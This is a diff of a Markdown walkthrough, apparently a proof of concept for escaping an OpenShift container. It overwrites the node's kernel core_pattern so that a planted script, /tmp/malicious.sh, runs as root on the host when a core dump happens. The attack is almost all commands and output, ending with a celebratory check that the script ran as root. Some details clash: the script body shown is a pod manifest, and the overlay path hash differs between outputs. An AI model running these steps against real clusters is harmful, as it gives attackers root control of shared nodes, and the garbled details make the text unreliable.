@@ -29,13 +29,13 @@ pod/malicious-script-host created
 ```
 # Determine Root Path From Host Mount Namespace
 #### This is the path to the root of the container from the perspective of the kernel.
-` oc exec -it malicious-script-host -- mount | grep overlay | awk -F, '{ print $6 }'`
+` oc exec malicious-script-host -- mount | grep overlay | awk -F, '{ print $6 }'`
 ```
 upperdir=/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e/diff
 ```
 # Copy contents of malicious.sh
 ```
-oc exec -i malicious-script-host -- /bin/bash -c "cat <<EOF > /tmp/malicious.sh
+oc exec malicious-script-host -- /bin/bash -c "cat <<EOF > /tmp/malicious.sh
 apiVersion: v1
 kind: Pod
 metadata:
@@ -45,10 +45,10 @@ spec:
   - name: ubi-8
     image: registry.access.redhat.com/ubi8/ubi:8.5-236
     command: ["tail", "-f", "/dev/null"]
-EOF
+EOF"
 ```
 # Modify script permissions and verify
-`oc exec -i malicious-script-host -- /bin/bash -c 'chmod 755 /tmp/malicious.sh && ls -al /tmp/malicious.sh'`
+`oc exec malicious-script-host -- /bin/bash -c 'chmod 755 /tmp/malicious.sh && ls -al /tmp/malicious.sh'`
 ```
 -rwxr-xr-x. 1 root root 197 Mar 17 19:22 /tmp/malicious.sh
 ```
@@ -66,18 +66,18 @@ malicious-script-host   1/1     Running             0          14m
 sysctl-set              0/1     ContainerCreating   0          68s
 ```
 ### Whether or not the sysctl-set pod starts, it will successfully update the node-wide core_pattern to point into our malicious-script-host container. 
-`oc exec -it malicious-script-host -- /bin/bash -c "cat /proc/sys/kernel/core_pattern"`
+`oc exec malicious-script-host -- /bin/bash -c "cat /proc/sys/kernel/core_pattern"`
 ```
 |/var/lib/containers/storage/overlay/3ef1281bce79865599f673b476957be73f994d17c15109d2b6a426711cf753e6/diff/tmp/malicious.sh #'
 ```
 # First enable core dumps:
-`oc exec -it malicious-script-host -- /bin/bash -c "ulimit -c unlimited && ulimit -c"`
+`oc exec malicious-script-host -- /bin/bash -c "ulimit -c unlimited && ulimit -c"`
 ```
 unlimited
 ```
 
 #### Note for ubi8 image ps will need to be installed via
-`oc exec -it malicious-script-host -- /bin/bash -c "yum install procps-ng -y && ps --version"`
+`oc exec malicious-script-host -- /bin/bash -c "yum install procps-ng -y && ps --version"`
 ```
 Installed:
   procps-ng-3.3.15-6.el8.x86_64
@@ -100,7 +100,7 @@ PID   USER     TIME  COMMAND
 ```
 # Verify Malicious Script Ran :boom: :beer:
 
-`oc exec -it malicious-script-host -- /bin/bash -c 'cat /output'`
+`oc exec malicious-script-host -- /bin/bash -c 'cat /output'`
 ```
 Wed Feb 23 14:20:07 UTC 2022
 root
